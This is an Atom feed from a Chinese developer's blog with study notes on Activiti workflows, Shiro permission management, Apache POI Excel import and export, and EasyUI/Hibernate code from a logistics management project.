<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Debug Genie</title>
  <subtitle>Trick or Treat</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://burinicc.cn/"/>
  <updated>2016-12-14T11:29:19.105Z</updated>
  <id>http://burinicc.cn/</id>
  
  <author>
    <name>burini</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>activiti工作流框架</title>
    <link href="http://burinicc.cn/2016/12/12/activiti%E5%B7%A5%E4%BD%9C%E6%B5%81%E6%A1%86%E6%9E%B6/"/>
    <id>http://burinicc.cn/2016/12/12/activiti工作流框架/</id>
    <published>2016-12-12T08:25:28.000Z</published>
    <updated>2016-12-14T11:29:19.105Z</updated>
    
    <content type="html"><![CDATA[<p>工作流：<br>用计算机技术实现业务过程的自动化，根据我们预先定义的规则解决多个参与者协同完成业务流程的技术。<br>activiti目录结构<br>bin下没有文件，database下有三个子文件夹create、drop、upgrade，里面存放不同的是脚本文件。其中upgrade是activiti由低版本升级高版本所对应的sql脚本。docs里面存放的是api等文件。<br>activiti工作流5.13<br>是依赖数据库（23张）来支持，使用mybatis操作数据库。他的前身是JBPM使用hibernate来操作数据库。<br>BPMN2.0<br>我们用来定义流程的文件名后缀。<br>使用工作流第一步：<br>根据create下的sql脚本创建数据库表（建议）、还可以使用api建表<br>所有的表都是由act开头，第二部分表示表的用途标识，其用途也和对应的API相同.<br>re<em>*: ‘re’代表repository，包含流程定义和流程静态资源（图片，规则等）<br>ru</em><em>:<br>‘runtime’,包含流程实例、任务、变量、异步任务等运行时的数据。Aciviti只在流程实例执行过程时保存这些数据，当流程结束后就会删除这些数据。<br>id_</em>:<br>‘identity’,包含用户身份信息，用户和组等。<br>hi<em>*:<br>‘history’,包含历史数据，比如历史流程实例、变量、任务。<br>ge</em>*:<br>‘generation’:通用数据，用在不同的场景下。</p>
<h1 id="使用API"><a href="#使用API" class="headerlink" title="使用API"></a>使用API</h1><p>1、设计流程定义BPMN2<br>2、部署流程定义，保存到数据库<br>getRepositoryService<br>两种方式：加载单个流程定义文件、加载压缩的zip流程定义文件<br>3、创建流程实例，<br>getRuntimeService<br>4、查看个人任务、办理个人任务<br>getTaskService<br>5、设置流程变量（4种方式）<br>开启流程时设置流程变量<br>startProcessInstanceByKey(“pylc”, variables);<br>办理任务时设置流程变量<br>processEngine.getTaskService().complete(taskid, variables);<br>RuntimeService的set方法<br>processEngine.getRuntimeService().setVariables(executionid, variables);<br>TaskService的set方法<br>processEngine.getTaskService().setVariables(taskid, variables);<br>注意：设置自定义对象，应实现Serializable接口<br>6、获取流程变量（3种方式）<br>RuntimeService的get方法<br>TaskService的get方法<br>使用框架提供的表单式获取，例如${activeUser}</p>
<h1 id="组任务"><a href="#组任务" class="headerlink" title="组任务"></a>组任务</h1><p>多个参与者都可以构成一个组，这个组对应的是角色，组里的每个成员都可以拾取组任务，变成个人任务。</p>
<h1 id="业务主键"><a href="#业务主键" class="headerlink" title="业务主键"></a>业务主键</h1><p>businesskey在启动流程时设置，通常是业务表的主键，当在办理任务时，可以通过业务主键来关联业务表，获取业务信息。</p>
<h1 id="排他网关"><a href="#排他网关" class="headerlink" title="排他网关"></a>排他网关</h1><p>流程走到某一步时，出现分支，通过我们设置的流程变量，在流程定义中在每个分支上的设置条件来判断流程该往哪一步执行，只能执行其中一条分支。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工作流：&lt;br&gt;用计算机技术实现业务过程的自动化，根据我们预先定义的规则解决多个参与者协同完成业务流程的技术。&lt;br&gt;activiti目录结构&lt;br&gt;bin下没有文件，database下有三个子文件夹create、drop、upgrade，里面存放不同的是脚本文件。其中up
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>权限管理</title>
    <link href="http://burinicc.cn/2016/12/09/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
    <id>http://burinicc.cn/2016/12/09/权限管理/</id>
    <published>2016-12-09T09:30:43.000Z</published>
    <updated>2016-12-10T11:18:50.475Z</updated>
    
    <content type="html"><![CDATA[<p>1、权限概述（认证、授权）<br>2、权限控制方式(URL拦截权限控制、方法注释权限控制)<br>3、权限数据模型（用户表、角色表、权限表、用户角色关系表、角色权限关系表）<br>4、shiro框架</p>
<h2 id="权限概述"><a href="#权限概述" class="headerlink" title="权限概述"></a>权限概述</h2><p>每个系统都会提供很多功能，也有很多不同的类型的用户，需要对这些类型的用户分配不同的功能。<br>认证：系统识别用户身份的功能，通常是用户名和密码的方式认证，也有指纹、ukey等认证方式。<br>授权：赋予用户访问某一功能的权利。</p>
<h2 id="权限控制方式"><a href="#权限控制方式" class="headerlink" title="权限控制方式"></a>权限控制方式</h2><p>不论用户是点击菜单还是直接在客户端输入http地址，都是发出http请求。<br>第一类：可以通过过滤器或者拦截器对http请求进行校验，如果该用户有权限访问，则放行；如果没有，则不放行。这是基于url拦截的方式进行权限控制。<br>第二类：当在action方法加上注解后，用户访问action为当前action的代理对象，当检验权限通过后，通过反射调用目标权限的方法；这是基于代理方式进行权限控制。</p>
<h2 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h2><p>例子：登录淘宝后不用再登录天猫<br>CAS<br>application code 开发人员写的应用程序代码<br>subject 当前用户（广义）<br>SecurityManager 安全管理器shiro框架的核心类<br>realm 类似于Dao，负责访问安全数据（用户数据、角色数据、权限数据)</p>
<h1 id="shiro使用"><a href="#shiro使用" class="headerlink" title="shiro使用"></a>shiro使用</h1><p>第一步：导入jar包<br>第二步：在web.xml配置spring整合shrio的过滤器<br>第三步：在spring文件中配置一个工厂bean为了创建shiro框架用到的过滤器<br>第四步：注册安全管理器，为安全管理器注入realm<br>第五步：注册realm</p>
<h2 id="shiro提供的权限控制方式："><a href="#shiro提供的权限控制方式：" class="headerlink" title="shiro提供的权限控制方式："></a>shiro提供的权限控制方式：</h2><p>URL拦截方式、方法注释、页面标签<br>方法注解只能强制使用cglib动态代理，因为基于action接口的jdk动态代理对我们意义不大。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1、权限概述（认证、授权）&lt;br&gt;2、权限控制方式(URL拦截权限控制、方法注释权限控制)&lt;br&gt;3、权限数据模型（用户表、角色表、权限表、用户角色关系表、角色权限关系表）&lt;br&gt;4、shiro框架&lt;/p&gt;
&lt;h2 id=&quot;权限概述&quot;&gt;&lt;a href=&quot;#权限概述&quot; cla
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="权限" scheme="http://burinicc.cn/tags/%E6%9D%83%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>apache poi 使用中文说明书</title>
    <link href="http://burinicc.cn/2016/12/08/apache-poi-%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>http://burinicc.cn/2016/12/08/apache-poi-使用中文说明书/</id>
    <published>2016-12-08T02:55:43.000Z</published>
    <updated>2016-12-08T13:18:45.853Z</updated>
    
    <content type="html"><![CDATA[<p>HSSF is the POI Project’s pure Java implementation of the Excel ‘97(-2007) file format. XSSF is the POI Project’s pure Java implementation of the Excel 2007 OOXML (.xlsx) file format.</p>
<p>HSSF and XSSF provides ways to read spreadsheets create, modify, read and write XLS spreadsheets. They provide:</p>
<pre><code>low level structures for those with special needs
an eventmodel api for efficient read-only access
a full usermodel api for creating, reading and modifying XLS files
</code></pre><p>XSSF导出 excel<br>1.导入jar包</p>
<p>2.拷贝工具类ExcelExportSXXSSF</p>
<p>XSSF操作03以上版本（07版本）excel，扩展名.xlsx，工作表行数没有限制<br>3.配置虚拟目录<br>在host标签中配置如下：</p>
<p><context path="/vir/" docbase="d:/upload/" reloadable="true"><br>这样在浏览上输入：<br><a href="http://ip地址：端口号/vir/" target="_blank" rel="external">http://ip地址：端口号/vir/</a><br>就可以访问d:/upload/目录下的文件了！servlet中可以使用如下代码得到webpath<br>/**            导出文件存放物理路径</context></p>
<pre><code> * @param fileWebPath
 *            导出文件web下载路径
 * @param filePrefix
 *            导出文件名的前缀          
 * @param flushRows
 *            存放在内存的数据量
 * @param fieldNames
 *            导出文件列标题
 * @param fieldCodes
 *               导出数据对象的字段名称     
 * @param flushRows*/
//导出文件存放的路径，并且是虚拟目录指向的路径
String filePath = &quot;d:/upload/&quot;;
//导出文件的前缀
String filePrefix=&quot;studentinfo&quot;;
//-1表示关闭自动刷新，手动控制写磁盘的时机，其它数据表示多少数据在内存保存，超过的则写入磁盘
int flushRows=100;

//定义导出数据的title
List&lt;String&gt; fieldNames=new ArrayList&lt;String&gt;();
fieldNames.add(&quot;性别&quot;);
fieldNames.add(&quot;年龄&quot;);
fieldNames.add(&quot;姓名&quot;);
fieldNames.add(&quot;爱好&quot;);

//告诉导出类数据list中对象的属性，让ExcelExportSXXSSF通过反射获取对象的值
List&lt;String&gt; fieldCodes=new ArrayList&lt;String&gt;();
fieldCodes.add(&quot;gender&quot;);//药品流水号
fieldCodes.add(&quot;age&quot;);//通用名
fieldCodes.add(&quot;name&quot;);//价格
fieldCodes.add(&quot;hobbies&quot;);



//注意：fieldCodes和fieldNames个数必须相同且属性和title顺序一一对应，这样title和内容才一一对应


//开始导出，执行一些workbook及sheet等对象的初始创建
ExcelExportSXXSSF excelExportSXXSSF = ExcelExportSXXSSF.start(filePath, &quot;/vir&quot;, filePrefix, fieldNames, fieldCodes, flushRows);

//准备导出的数据，将数据存入list，且list中对象的字段名称必须是刚才传入ExcelExportSXXSSF的名称
List&lt;Student&gt; list = new ArrayList&lt;Student&gt;();

list.add(new Student(&quot;男&quot;, 23, &quot;张三&quot;, &quot;乒乓球,羽毛球&quot;));
list.add(new Student(&quot;男&quot;, 24, &quot;李四&quot;, &quot;篮球,羽毛球&quot;));
list.add(new Student(&quot;女&quot;, 25, &quot;小红&quot;, &quot;高尔夫,羽毛球&quot;));
list.add(new Student(&quot;男&quot;, 23, &quot;小刘&quot;, &quot;乒乓球,羽毛球&quot;));

//执行导出
excelExportSXXSSF.writeDatasByObject(list);
//输出文件，返回下载文件的http地址
String webpath = excelExportSXXSSF.exportFile();

System.out.println(webpath);
</code></pre><a id="more"></a>
<p>总结：通过<br><a href="http://localhost:8089/vir/studentinfo_20161128200022.xlsx" target="_blank" rel="external">http://localhost:8089/vir/studentinfo_20161128200022.xlsx</a><br>就可以导出Excel文件了！<br>HSSF导入excel文件</p>
<p>将线下编辑好的excel导入系统中，从客户端导入服务端。</p>
<p>第一步：线下编辑导入文件<br>   根据提前定义好的导入文件规则去定义，根据导入模块编写导入文件。</p>
<p>第二步：登陆系统，执行导入<br>   将本地的文件上传到服务端<br>第三步：服务端程序解析导入文件内容<br>   读文件过程。<br>HSSF事件驱动模式</p>
<p>事件驱动式，类似xml的sax解析。</p>
<p>需要实现HSSFListener接口。</p>
<p>原理：根据excel底层存储（07以版本采用xml存储，以下版本采用二进制）标签决定事件出发点。<br>目标：在解析完一行(row)数据时进行触发。</p>
<!--more-->
<p>优点：读取大数据时，不会导致内存溢出<br>缺点：用户在解析数据时比较困难。读取数据时速度不快的，因为读取数据的同时根据每个标签进行事件触发<br>使用数据导入封装类方法：<br>实现HxlsOptRowsInterface（service）<br>根据具体业务需求，实现此接口</p>
<p>文件上传的action</p>
<p>在action调用工具类<br>使用HxlsRead工具类执行数据导入，需要上传文件<br>文件上传需要在springmvc.xml中配置：<br>        <!-- 文件上传 --><br>    <bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver"><br>        <!-- 设置上传文件的最大尺寸为5MB --><br>        <property name="maxUploadSize"><br>            <value>5242880</value><br>        </property><br>    </bean><br>Action：<br>//药品导入提交<br>    @RequestMapping(“/importypxxsubmit”)<br>    public @ResponseBody SubmitResultInfo importypxxsubmit(<br>            //写上传的文件<br>            MultipartFile ypxximportfile<br>            )throws Exception{</p>
<pre><code>//将上传的文件写到磁盘
String originalFilename  = ypxximportfile.getOriginalFilename();
//写入磁盘的文件
File file = new File(&quot;D:/upload/linshi/&quot;+UUIDBuild.getUUID()+originalFilename.substring(originalFilename.lastIndexOf(&quot;.&quot;)));
if(!file.exists()){
    //如果文件目录 不存在则创建
    file.mkdirs();
}

//将内存中的文件写磁盘
ypxximportfile.transferTo(file);
//上传文件磁盘上路径
String absolutePath = file.getAbsolutePath();
</code></pre><!--more-->
<pre><code>//调用工具类进行药品目录 导入
HxlsRead xls2csv = null;
try {
    //第一个参数就是导入的文件
    //第二个参数就是导入文件中哪个sheet
    //第三个参数导入接口的实现类对象
    xls2csv = new HxlsRead(absolutePath,1,ypxxImportService);
    xls2csv.process();
} catch (FileNotFoundException e) {
    e.printStackTrace();
} catch (IOException e) {
    e.printStackTrace();
} catch (SQLException e) {
    e.printStackTrace();
}

//提示导入成功条数
long success_num = xls2csv.getOptRows_success();
//导入失败数量
long failure_num = xls2csv.getOptRows_failure();

//对导入失败记录处理
//获取导入失败记录
//xls2csv.getFailrows()
//获取导入记录的title
//xls2csv.getRowtitle();
//获取导入失败原因
//xls2csv.getFailmsgs()

//将上边获取到的失败记录、title、失败原因，导出成一个 excel
//使用工具类进行导出，得到导出文件下载路径
//......


return ResultUtil.createSubmitResult(ResultUtil.createSuccess(Config.MESSAGE, 314, new Object[]{
        success_num,failure_num
}));
</code></pre><p>实现HxlsOptRowsInterface的方法参考</p>
<p>目录下的YpxxImportServiceImpl.java</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HSSF is the POI Project’s pure Java implementation of the Excel ‘97(-2007) file format. XSSF is the POI Project’s pure Java implementation of the Excel 2007 OOXML (.xlsx) file format.&lt;/p&gt;
&lt;p&gt;HSSF and XSSF provides ways to read spreadsheets create, modify, read and write XLS spreadsheets. They provide:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;low level structures for those with special needs
an eventmodel api for efficient read-only access
a full usermodel api for creating, reading and modifying XLS files
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;XSSF导出 excel&lt;br&gt;1.导入jar包&lt;/p&gt;
&lt;p&gt;2.拷贝工具类ExcelExportSXXSSF&lt;/p&gt;
&lt;p&gt;XSSF操作03以上版本（07版本）excel，扩展名.xlsx，工作表行数没有限制&lt;br&gt;3.配置虚拟目录&lt;br&gt;在host标签中配置如下：&lt;/p&gt;
&lt;p&gt;&lt;Context path=&quot;/vir/&quot; docBase=&quot;d:/upload/&quot; reloadable=&quot;true&quot; /&gt;&lt;br&gt;这样在浏览上输入：&lt;br&gt;&lt;a href=&quot;http://ip地址：端口号/vir/&quot;&gt;http://ip地址：端口号/vir/&lt;/a&gt;&lt;br&gt;就可以访问d:/upload/目录下的文件了！servlet中可以使用如下代码得到webpath&lt;br&gt;/**            导出文件存放物理路径&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; * @param fileWebPath
 *            导出文件web下载路径
 * @param filePrefix
 *            导出文件名的前缀          
 * @param flushRows
 *            存放在内存的数据量
 * @param fieldNames
 *            导出文件列标题
 * @param fieldCodes
 *               导出数据对象的字段名称     
 * @param flushRows*/
//导出文件存放的路径，并且是虚拟目录指向的路径
String filePath = &amp;quot;d:/upload/&amp;quot;;
//导出文件的前缀
String filePrefix=&amp;quot;studentinfo&amp;quot;;
//-1表示关闭自动刷新，手动控制写磁盘的时机，其它数据表示多少数据在内存保存，超过的则写入磁盘
int flushRows=100;

//定义导出数据的title
List&amp;lt;String&amp;gt; fieldNames=new ArrayList&amp;lt;String&amp;gt;();
fieldNames.add(&amp;quot;性别&amp;quot;);
fieldNames.add(&amp;quot;年龄&amp;quot;);
fieldNames.add(&amp;quot;姓名&amp;quot;);
fieldNames.add(&amp;quot;爱好&amp;quot;);

//告诉导出类数据list中对象的属性，让ExcelExportSXXSSF通过反射获取对象的值
List&amp;lt;String&amp;gt; fieldCodes=new ArrayList&amp;lt;String&amp;gt;();
fieldCodes.add(&amp;quot;gender&amp;quot;);//药品流水号
fieldCodes.add(&amp;quot;age&amp;quot;);//通用名
fieldCodes.add(&amp;quot;name&amp;quot;);//价格
fieldCodes.add(&amp;quot;hobbies&amp;quot;);



//注意：fieldCodes和fieldNames个数必须相同且属性和title顺序一一对应，这样title和内容才一一对应


//开始导出，执行一些workbook及sheet等对象的初始创建
ExcelExportSXXSSF excelExportSXXSSF = ExcelExportSXXSSF.start(filePath, &amp;quot;/vir&amp;quot;, filePrefix, fieldNames, fieldCodes, flushRows);

//准备导出的数据，将数据存入list，且list中对象的字段名称必须是刚才传入ExcelExportSXXSSF的名称
List&amp;lt;Student&amp;gt; list = new ArrayList&amp;lt;Student&amp;gt;();

list.add(new Student(&amp;quot;男&amp;quot;, 23, &amp;quot;张三&amp;quot;, &amp;quot;乒乓球,羽毛球&amp;quot;));
list.add(new Student(&amp;quot;男&amp;quot;, 24, &amp;quot;李四&amp;quot;, &amp;quot;篮球,羽毛球&amp;quot;));
list.add(new Student(&amp;quot;女&amp;quot;, 25, &amp;quot;小红&amp;quot;, &amp;quot;高尔夫,羽毛球&amp;quot;));
list.add(new Student(&amp;quot;男&amp;quot;, 23, &amp;quot;小刘&amp;quot;, &amp;quot;乒乓球,羽毛球&amp;quot;));

//执行导出
excelExportSXXSSF.writeDatasByObject(list);
//输出文件，返回下载文件的http地址
String webpath = excelExportSXXSSF.exportFile();

System.out.println(webpath);
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="Apache poi" scheme="http://burinicc.cn/tags/Apache-poi/"/>
    
  </entry>
  
  <entry>
    <title>二期改造项目2</title>
    <link href="http://burinicc.cn/2016/12/04/%E4%BA%8C%E6%9C%9F%E6%94%B9%E9%80%A0%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B02/"/>
    <id>http://burinicc.cn/2016/12/04/二期改造项目笔记2/</id>
    <published>2016-12-04T06:03:05.000Z</published>
    <updated>2016-12-09T09:16:52.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解决windows窗口bug"><a href="#解决windows窗口bug" class="headerlink" title="解决windows窗口bug"></a>解决windows窗口bug</h2><p>描述：当控件移动到窗口外就不能移动<br>解决方案：将outOfBounds.js引入到使用窗口控件的页面</p>
<h2 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h2><p>它是通常在数据库中设计两张表一张dicttype一张dictinfo，dictinfo是dicttype的子表。</p>
<h1 id="业务功能开发"><a href="#业务功能开发" class="headerlink" title="业务功能开发"></a>业务功能开发</h1><p>取派员维护</p>
<h1 id="添加取派员："><a href="#添加取派员：" class="headerlink" title="添加取派员："></a>添加取派员：</h1><p>手机号校验需要扩展validatebox的校验规则</p>
<pre>
var regex=/^1[3|5|7|8|9][0-9]{9}$/;
$.extend($.fn.validatebox.defaults.rules, {   
    phonenumber: {   
        validator: function(value, param){   
            return regex.test(value);   
        },   
        message: '您的手机号输入有误！'  
    }   
});
//对手机号输入框应用规则
&ltinput class="easyui-validatebox" data-options="validType:'phonenumber'"&gt

</pre>




<h1 id="分页查询取派员："><a href="#分页查询取派员：" class="headerlink" title="分页查询取派员："></a>分页查询取派员：</h1><h2 id="Dao层"><a href="#Dao层" class="headerlink" title="Dao层"></a>Dao层</h2><p>//离线查询对象<br>DetachedCriteria detachedCriteria=pageBean.getDetachedCriteria();<br>//总数据量<br>//改变hibernate发出sql的形式,人为控制发出的sql,下面一句相当于发出</p>
<pre>
//select count(*) from table_name;
detachedCriteria.setProjection(Projections.rowCount());
List<long> list=this.getHibernateTemplate().findByCriteria(detachedCriteria);
Long total=list.get(0);
pageBean.setTotal(total.intValue());
//改变hibernate发出sql的形式,重置select * from table_name;(默认)
detachedCriteria.setProjection(null);
//按照映射文件的映射关系将表的数据映射到对象的属性上
detachedCriteria.setResultTransformer(DetachedCriteria.ROOT_ENTITY);
List rows=this.getHibernateTemplate().findByCriteria(detachedCriteria,pageStart, pageSize)
</long></pre>


<h2 id="表现层"><a href="#表现层" class="headerlink" title="表现层"></a>表现层</h2><p>注意事项：复选框的值如果勾选会随着表单提交到action，如果不勾选不会提交。<br>JSONObject jsonObj=JSONObject.fromObject(pageBean);<br>JSONObject 将对象转换为json数据，页面只需要page和rows干掉页面不需要的数据</p>
<p>JsonConfig jsonConfig=new JsonConfig();<br>                jsonConfig.setExcludes(new String[]{“currentPage”,”pageSize”,”detachedCriteria”,”pageStart”});<br>                JSONObject jsonObj=JSONObject.fromObject(pageBean,jsonConfig);</p>
<h1 id="批量删除（逻辑删除）"><a href="#批量删除（逻辑删除）" class="headerlink" title="批量删除（逻辑删除）"></a>批量删除（逻辑删除）</h1><h2 id="页面："><a href="#页面：" class="headerlink" title="页面："></a>页面：</h2><p>var rows=$(“#grid”).datagrid(“getSelections”);<br>        if(rows.length==0){<br>            $.messager.alert(“提示信息”,”你没有选择任何内容！”,”warning”);<br>        }else{<br>            var idArray=new Array();<br>        for(var i=0;i&lt;rows.length;i++){<br>              idArray[i]=rows[i].id;<br>             //idArray.push(rows[i].id);<br>        }<br>        var ids=idArray.join(“,”);<br>        window.location.href=”${pageContext.request.contextPath}/staffAction_delete.action?ids=”+ids;<br>        }</p>
<h1 id="修改取派员信息"><a href="#修改取派员信息" class="headerlink" title="修改取派员信息"></a>修改取派员信息</h1><p>在datagrid中定义一个双击行事件onDblClickRow<br>function doDblClickRow(rowIndex, rowData){<br>  //打开修改取派员窗口<br>  $(‘#editStaffWindow’).window(“open”);<br>  //rowData将数据装到form表单<br>  $(‘#editstaffForm’).form(‘load’,rowData);<br>  //alert(rowData.name);<br>  $(‘#edit’).click(<br>    function(){<br>      var v=$(‘#editstaffForm’).form(“validate”);<br>      if(v){<br>        $(‘#editstaffForm’).submit();<br>      }<br>    }<br>  );<br>}<br>更新时需要注意先从数据中查询原始数据，然后在原始数据对象上修改。不能把模型对象直接交给hibernate更新。</p>
<h1 id="区域设置"><a href="#区域设置" class="headerlink" title="区域设置"></a>区域设置</h1><p>一键导入（使用jQuery提供的ocupload.js插件）<br>原理：在form表单中动态添加target属性，值等于动态生成的iframe的name，实现页面没有跳转的效果。<br>使用规则：<br>第一步：在jsp页面中引入插件的js文件<br>第二步：在页面中提供任意一个元素<br>input id=’btn1’ value=”上传” type=”button”<br>第三步：调用插件提供的upload方法，动态修改页面html代码<br>$(function(){<br>    $(“#btn1”).upload(<br>      {<br>        action:’xxx.action’<br>        name:’myfile’<br>      }<br>      );<br>  });</p>
<h2 id="解析excel文件（POI的使用）"><a href="#解析excel文件（POI的使用）" class="headerlink" title="  解析excel文件（POI的使用）"></a>  解析excel文件（POI的使用）</h2><p>  对于小数据量可以用hssf在action中直接解析<br>  第一步：HSSFWorkbook<br>  第二步：Sheet<br>  第三步：Row<br>  第四步：Cell<br></p>
  <pre>
    HSSFWorkbook workbook=new HSSFWorkbook(new FileInputStream(myfile));
       HSSFSheet sheet=workbook.getSheetAt(0);

       List<region> list=new ArrayList<region>();
       for(Row row:sheet){
         int rownum=row.getRowNum();
         if(rownum==0){
              continue;
         }
        String id=row.getCell(0).getStringCellValue();
        String  province=row.getCell(1).getStringCellValue();
        String  city=row.getCell(2).getStringCellValue();
        String  district=row.getCell(3).getStringCellValue();
        String  postcode=row.getCell(4).getStringCellValue();
        Region region=new Region(id, province, city, district, postcode, null, null, null);
        list.add(region);
       }
       regionService.insertBatch(list);
</region></region></pre>





<h2 id="使用Pinyin4J生成简码和城市编码"><a href="#使用Pinyin4J生成简码和城市编码" class="headerlink" title="使用Pinyin4J生成简码和城市编码"></a>使用Pinyin4J生成简码和城市编码</h2><p>导入一个pinyin4j工具类和jar包然后根据城市名称生成简码和城市编码。</p>
<h1 id="添加分区"><a href="#添加分区" class="headerlink" title="添加分区"></a>添加分区</h1><p>第一步：使用combobox展示区域数据到下拉框中<br>第二步：在RegionAction中提供findALL方法，查询所有的区域数据，返回json数据,<br>为了使返回的json中含有name字段，需要在Region类中提供getName方法</p>
<p>组合条件查询：<br>页面使用datagrid的load的方法<br><a id="more"></a></p>
<h1 id="添加定区"><a href="#添加定区" class="headerlink" title="添加定区"></a>添加定区</h1><p>在向定区表中插入数据的时候，还应该更新分区表中的decidezone_id<br>这个时候应该看inverse的值，谁的值为true，表示谁放弃了维护外键的权利。通常情况下，外键是由多的一方来维护。</p>
<h2 id="Datagrid的编辑功能"><a href="#Datagrid的编辑功能" class="headerlink" title="Datagrid的编辑功能"></a>Datagrid的编辑功能</h2><p>通过数据表格的列属性editor开启指定列的编辑功能<br>数据表格的方法：<br>插入一行：insertRow<br>删除一行：deleteRow<br>开启编辑状态：beginEdit<br>结束编辑状态：endEdit<br>获得选中行的索引：getRowIndex<br>获得选中的第一行：getSelected<br>数据表格的事件：<br>结束编辑状态时触发：onAfterEdit</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;解决windows窗口bug&quot;&gt;&lt;a href=&quot;#解决windows窗口bug&quot; class=&quot;headerlink&quot; title=&quot;解决windows窗口bug&quot;&gt;&lt;/a&gt;解决windows窗口bug&lt;/h2&gt;&lt;p&gt;描述：当控件移动到窗口外就不能移动&lt;br&gt;解决方案：将outOfBounds.js引入到使用窗口控件的页面&lt;/p&gt;
&lt;h2 id=&quot;数据字典&quot;&gt;&lt;a href=&quot;#数据字典&quot; class=&quot;headerlink&quot; title=&quot;数据字典&quot;&gt;&lt;/a&gt;数据字典&lt;/h2&gt;&lt;p&gt;它是通常在数据库中设计两张表一张dicttype一张dictinfo，dictinfo是dicttype的子表。&lt;/p&gt;
&lt;h1 id=&quot;业务功能开发&quot;&gt;&lt;a href=&quot;#业务功能开发&quot; class=&quot;headerlink&quot; title=&quot;业务功能开发&quot;&gt;&lt;/a&gt;业务功能开发&lt;/h1&gt;&lt;p&gt;取派员维护&lt;/p&gt;
&lt;h1 id=&quot;添加取派员：&quot;&gt;&lt;a href=&quot;#添加取派员：&quot; class=&quot;headerlink&quot; title=&quot;添加取派员：&quot;&gt;&lt;/a&gt;添加取派员：&lt;/h1&gt;&lt;p&gt;手机号校验需要扩展validatebox的校验规则&lt;/p&gt;
&lt;pre&gt;
var regex=/^1[3|5|7|8|9][0-9]{9}$/;
$.extend($.fn.validatebox.defaults.rules, {   
    phonenumber: {   
        validator: function(value, param){   
            return regex.test(value);   
        },   
        message: &#39;您的手机号输入有误！&#39;  
    }   
});
//对手机号输入框应用规则
&amp;ltinput class=&quot;easyui-validatebox&quot; data-options=&quot;validType:&#39;phonenumber&#39;&quot;&amp;gt

&lt;/pre&gt;




&lt;h1 id=&quot;分页查询取派员：&quot;&gt;&lt;a href=&quot;#分页查询取派员：&quot; class=&quot;headerlink&quot; title=&quot;分页查询取派员：&quot;&gt;&lt;/a&gt;分页查询取派员：&lt;/h1&gt;&lt;h2 id=&quot;Dao层&quot;&gt;&lt;a href=&quot;#Dao层&quot; class=&quot;headerlink&quot; title=&quot;Dao层&quot;&gt;&lt;/a&gt;Dao层&lt;/h2&gt;&lt;p&gt;//离线查询对象&lt;br&gt;DetachedCriteria detachedCriteria=pageBean.getDetachedCriteria();&lt;br&gt;//总数据量&lt;br&gt;//改变hibernate发出sql的形式,人为控制发出的sql,下面一句相当于发出&lt;/p&gt;
&lt;pre&gt;
//select count(*) from table_name;
detachedCriteria.setProjection(Projections.rowCount());
List&lt;Long&gt; list=this.getHibernateTemplate().findByCriteria(detachedCriteria);
Long total=list.get(0);
pageBean.setTotal(total.intValue());
//改变hibernate发出sql的形式,重置select * from table_name;(默认)
detachedCriteria.setProjection(null);
//按照映射文件的映射关系将表的数据映射到对象的属性上
detachedCriteria.setResultTransformer(DetachedCriteria.ROOT_ENTITY);
List rows=this.getHibernateTemplate().findByCriteria(detachedCriteria,pageStart, pageSize)
&lt;/pre&gt;


&lt;h2 id=&quot;表现层&quot;&gt;&lt;a href=&quot;#表现层&quot; class=&quot;headerlink&quot; title=&quot;表现层&quot;&gt;&lt;/a&gt;表现层&lt;/h2&gt;&lt;p&gt;注意事项：复选框的值如果勾选会随着表单提交到action，如果不勾选不会提交。&lt;br&gt;JSONObject jsonObj=JSONObject.fromObject(pageBean);&lt;br&gt;JSONObject 将对象转换为json数据，页面只需要page和rows干掉页面不需要的数据&lt;/p&gt;
&lt;p&gt;JsonConfig jsonConfig=new JsonConfig();&lt;br&gt;                jsonConfig.setExcludes(new String[]{“currentPage”,”pageSize”,”detachedCriteria”,”pageStart”});&lt;br&gt;                JSONObject jsonObj=JSONObject.fromObject(pageBean,jsonConfig);&lt;/p&gt;
&lt;h1 id=&quot;批量删除（逻辑删除）&quot;&gt;&lt;a href=&quot;#批量删除（逻辑删除）&quot; class=&quot;headerlink&quot; title=&quot;批量删除（逻辑删除）&quot;&gt;&lt;/a&gt;批量删除（逻辑删除）&lt;/h1&gt;&lt;h2 id=&quot;页面：&quot;&gt;&lt;a href=&quot;#页面：&quot; class=&quot;headerlink&quot; title=&quot;页面：&quot;&gt;&lt;/a&gt;页面：&lt;/h2&gt;&lt;p&gt;var rows=$(“#grid”).datagrid(“getSelections”);&lt;br&gt;        if(rows.length==0){&lt;br&gt;            $.messager.alert(“提示信息”,”你没有选择任何内容！”,”warning”);&lt;br&gt;        }else{&lt;br&gt;            var idArray=new Array();&lt;br&gt;        for(var i=0;i&amp;lt;rows.length;i++){&lt;br&gt;              idArray[i]=rows[i].id;&lt;br&gt;             //idArray.push(rows[i].id);&lt;br&gt;        }&lt;br&gt;        var ids=idArray.join(“,”);&lt;br&gt;        window.location.href=”${pageContext.request.contextPath}/staffAction_delete.action?ids=”+ids;&lt;br&gt;        }&lt;/p&gt;
